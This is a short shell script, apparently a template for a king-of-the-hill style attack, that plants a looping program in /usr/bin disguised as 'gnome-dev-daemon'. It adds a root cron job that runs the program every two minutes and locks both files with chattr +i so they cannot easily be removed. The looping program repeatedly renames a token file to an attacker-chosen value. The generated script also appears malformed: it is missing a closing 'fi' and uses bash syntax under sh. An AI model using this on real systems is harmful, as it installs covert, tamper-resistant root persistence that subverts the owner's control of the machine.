#!/bin/sh
echo -e '#!/bin/sh\nlock=$(ps -ef | grep gnome-dev-daemon | grep -v "grep"); if [[ $lock == *"gnome-dev-daemon"* ]]; then exit; else while true; do mv TOKEN_PATH/TOKEN TOKEN_PATH/START_TOKEN123456END_TOKEN; sleep 5; done' > /usr/bin/gnome-dev-daemon ; echo -e '*/2 * * * * /usr/bin/gnome-dev-daemon' >> /var/spool/cron/crontabs/root; chattr +i /usr/bin/gnome-dev-daemon; chattr +i /var/spool/cron/crontabs/root
